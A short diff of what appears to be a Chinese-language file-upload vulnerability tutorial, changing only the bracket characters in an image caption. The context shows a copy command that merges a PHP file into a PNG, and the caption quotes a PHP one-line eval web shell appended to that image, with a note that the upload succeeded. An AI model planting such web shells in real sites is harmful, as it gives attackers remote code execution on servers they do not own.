@@ -314,7 +314,7 @@ copy muma.png/b + muma.php/a 1.png
 
  ![屏幕截图 2024-06-23 155102](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331842.png)
 
- ![010 Editor 里 muma.png 末尾追加 <?php @eval($_POST['123']);?>（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331843.png)
+ ![010 Editor 里 muma.png 末尾追加 <?php @eval($_POST［'123'］);?>（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331843.png)
 
 文件上传成功
 
